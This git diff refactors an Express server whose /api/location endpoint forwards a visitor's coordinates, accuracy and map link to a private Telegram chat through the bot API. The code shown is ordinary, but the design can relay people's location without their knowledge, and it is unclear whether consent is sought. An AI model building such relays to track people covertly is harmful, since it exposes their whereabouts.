@@ -1,13 +1,12 @@
 const express = require("express");
-const path = require("path");
 require("dotenv").config();
 
 const app = express();
-
-app.use(express.json());
-app.use(express.static(__dirname));
-
 const PORT = process.env.PORT || 3000;
+
+// Root folder se index.html serve karega
+app.use(express.static(__dirname));
+app.use(express.json());
 
 app.post("/api/location", async (req, res) => {
   try {
@@ -34,7 +33,8 @@ app.post("/api/location", async (req, res) => {
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
     if (!token || !chatId) {
-      console.error("❌ Telegram environment variables missing");
+      console.error("Telegram environment variables missing");
+
       return res.status(500).json({
         ok: false,
         error: "Telegram configuration missing"
@@ -53,19 +53,19 @@ Accuracy: ${Math.round(accuracy || 0)} meters
 
 🗺️ ${mapUrl}`;
 
-    const telegramUrl =
-      `https://api.telegram.org/bot${token}/sendMessage`;
-
-    const telegramResponse = await fetch(telegramUrl, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message
-      })
-    });
+    const telegramResponse = await fetch(
+      `https://api.telegram.org/bot${token}/sendMessage`,
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }
+    );
 
     const telegramData = await telegramResponse.json();
 
